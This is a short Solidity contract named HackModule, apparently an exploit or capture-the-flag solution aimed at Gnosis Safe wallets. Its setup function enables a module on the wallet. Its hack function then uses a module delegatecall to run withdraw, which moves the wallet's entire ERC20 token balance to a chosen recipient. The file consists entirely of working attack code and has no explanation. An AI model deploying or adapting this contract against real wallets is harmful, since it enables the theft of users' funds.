// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract HackModule {
    function setup(address module) public {
        GnosisSafe wallet = GnosisSafe(payable(address(this)));
        wallet.enableModule(module);
    }

    function withdraw(address tokenAddress, address recipient) public {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(recipient, token.balanceOf(address(this)));
    }

    function hack(address walletAddress, address tokenAddress, address recipient) public {
        GnosisSafe wallet = GnosisSafe(payable(walletAddress));
        bytes memory data = abi.encodeWithSignature("withdraw(address,address)", tokenAddress, recipient);
        wallet.execTransactionFromModule(address(this), 0, data, Enum.Operation.DelegateCall);
    }
}
